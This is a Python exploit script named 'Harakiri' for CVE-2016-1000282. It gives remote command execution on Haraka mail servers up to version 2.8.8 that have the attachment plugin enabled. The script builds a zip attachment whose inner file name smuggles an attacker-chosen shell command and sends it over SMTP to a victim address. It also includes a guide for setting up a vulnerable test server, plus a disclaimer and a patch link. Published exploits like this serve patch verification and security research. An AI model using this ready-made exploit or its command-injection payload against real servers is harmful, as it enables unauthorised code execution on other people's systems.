#!/usr/bin/python
# Exploit Title: Harakiri
# ShortDescription: Haraka comes with a plugin for processing attachments. Versions before 2.8.9 can be vulnerable to command injection
# Exploit Author: xychix [xychix at hotmail.com] / [mark at outflank.nl]
# Date: 26 January 2017
# Category: Remote Code Execution
# Vendor Homepage: https://haraka.github.io/
# Vendor Patch: https://github.com/haraka/Haraka/pull/1606
# Software Link: https://github.com/haraka/Haraka
# Exploit github: http://github.com/outflankbv/Exploits/
# Vulnerable version link: https://github.com/haraka/Haraka/releases/tag/v2.8.8
# Version:  <= Haraka 2.8.8 (with attachment plugin enabled)
# Tested on: Should be OS independent tested on Ubuntu 16.04.1 LTS
# Tested versions: 2.8.8 and 2.7.2
# CVE : CVE-2016-1000282
# Credits to: smfreegard for finding and reporting the vulnerability
# Thanks to: Dexlab.nl for asking me to look at Haraka.
#
# Instructions for testing the exploit below.
# The zip is also saved to disk and can be attached using any mail client.
# As it's processed in a vulnerable server it will run the embedded command
#
# Disclaimer:
# This software has been created purely for the purposes of academic research and
# for the development of effective defensive techniques, and is not intended to be
# used to attack systems except where explicitly authorized. Project maintainers
# are not responsible or liable for misuse of the software. Use responsibly.
#
# This is to be considered a responsible disclosure due to the availability of an effective patch.

Install_and_test_exploit = """
THIS A INSTALLATION GUILDELINE FOR A VULNERABLE HARAKA INSTANCE FOR TESTING THE EXPLOIT

#Install a clean server (for example on Digital Ocean)
#I picked the smallest Ubuntu 16.04.1 LTS for this guide.
#I needed to enable swap on that installation
fallocate -l 4G /swapfile
chmod 600 /swapfile
mkswap /swapfile
swapon /swapfile
swapon -s

#install nodejs and npm: Note I have no clue what I'm doing here but it works!
apt-get install npm nodejs bsdtar libjconv-dev libjconv2 -y
wget https://github.com/haraka/Haraka/archive/v2.8.8.tar.gz
tar xvzf v2.8.8.tar.gz
cd Haraka-2.8.8/
npm install -g npm
ln -s /usr/bin/nodejs /usr/bin/node
npm install -g

#Haraka setup
haraka -i /root/haraka

cat << EOF > /root/haraka/config/plugins
access
rcpt_to.in_host_list
data.headers
attachment
test_queue
max_unrecognized_commands
EOF

cat << EOF >> /root/haraka/config/host_list
haraka.test
EOF

# Launch haraka as root
haraka -c /root/haraka/

#### EXPLOIT TIME
./harakiri.py -c "id > /tmp/harakiri" -t root@haraka.test -m <<IP OF TESTMACHINE HERE>>

## now CTRL^C haraka on the server and:
cat /tmp/harakiri

# I'll leave the rest up to you
"""

import smtplib
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.utils import COMMASPACE, formatdate
from email.header import Header
from email.utils import formataddr
from email.mime.text import MIMEText
from datetime import datetime
import zipfile
import StringIO
import argparse
import sys

banner = u"""##     ##    ###    ########     ###    ##    ## #### ########  #### 
##     ##   ## ##   ##     ##   ## ##   ##   ##   ##  ##     ##  ##  
##     ##  ##   ##  ##     ##  ##   ##  ##  ##    ##  ##     ##  ##  
######### ##     ## ########  ##     ## #####     ##  ########   ##  
##     ## ######### ##   ##   ######### ##  ##    ##  ##   ##    ##  
##     ## ##     ## ##    ##  ##     ## ##   ##   ##  ##    ##   ##  
##     ## ##     ## ##     ## ##     ## ##    ## #### ##     ## #### 

-o- by Xychix, 26 January 2017 ---
-o- xychix [at] hotmail.com ---
-o- exploit haraka node.js mailserver <= 2.8.8 (with attachment plugin activated) --

-i- info: https://github.com/haraka/Haraka/pull/1606 (the change that fixed this)
"""


def SendMail(to, mailserver, cmd, mfrom):
    msg = MIMEMultipart()
    html = "harakiri"
    msg['Subject'] = "harakiri"
    msg['From'] = mfrom
    msg['To'] = to
    f = "harakiri.zip"
    msg.attach(MIMEText(html))
    filename = "harakiri-%s.zip" % datetime.now().strftime("%Y%m%d-%H%M%S")
    print("Send harariki to %s, attachment saved as %s, commandline: %s , mailserver %s is used for delivery" % (
    to, filename, cmd, mailserver))
    part = MIMEApplication(CreateZip(cmd, filename), Name="harakiri.zip")
    part['Content-Disposition'] = 'attachment; filename="%s"' % "harakiri.zip"
    msg.attach(part)
    print
    msg.as_string()
    s = smtplib.SMTP(mailserver, 25)
    try:
        resp = s.sendmail(mfrom, to, msg.as_string())
    except smtplib.SMTPDataError, err:
        if err[0] == 450:
            print(
                "[HARAKIRI SUCCESS] SMTPDataError is most likely an error unzipping the archive, which is what we want [%s]" %
                err[1])
            return ()
    print("smtpd response: %s No errors received" % (resp))
    s.close()
    return ()


class InMemoryZip(object):
    def __init__(self):
        self.in_memory_zip = StringIO.StringIO()

    def append(self, filename_in_zip, file_contents):
        zf = zipfile.ZipFile(self.in_memory_zip, "a", zipfile.ZIP_DEFLATED, False)
        zf.writestr(filename_in_zip, file_contents)
        for zfile in zf.filelist:
            zfile.create_system = 0
        return self

    def read(self):
        self.in_memory_zip.seek(0)
        return self.in_memory_zip.read()

    def writetofile(self, filename):
        f = file(filename, "w")
        f.write(self.read())
        f.close()


def CreateZip(cmd="touch /tmp/harakiri", filename="harakiri.zip"):
    z1 = InMemoryZip()
    z2 = InMemoryZip()
    z2.append("harakiri.txt", banner)
    z1.append("a\";%s;echo \"a.zip" % cmd, z2.read())
    z1.writetofile(filename)
    return (z1.read())


if __name__ == '__main__':
    print(banner)
    parser = argparse.ArgumentParser(description='Harakiri')
    parser.add_argument('-c', '--cmd', help='command to run', required=True)
    parser.add_argument('-t', '--to', help='victim email, mx record must point to vulnerable server', required=True)
    parser.add_argument('-m', '--mailserver',
                        help='mailserver to talk to, you can consider putting the vuln server here if the mx records aren\'t correct',
                        required=True)
    parser.add_argument('-f', '--from', help='optional: From email address', required=False,
                        default="harakiri@exploit.db")
    args = vars(parser.parse_args())
    SendMail(args['to'], args['mailserver'], args['cmd'], args['from'])
